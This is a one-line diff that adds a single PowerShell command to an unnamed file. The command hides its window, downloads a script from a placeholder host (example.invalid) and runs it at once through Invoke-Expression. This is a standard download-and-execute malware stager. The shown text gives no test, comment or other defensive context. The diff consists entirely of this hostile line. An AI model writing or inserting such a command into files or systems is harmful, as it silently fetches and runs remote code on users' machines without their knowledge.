@@ -1,0 +1,1 @@
+powershell -win hid -c "iwr https://example.invalid/w|iex"
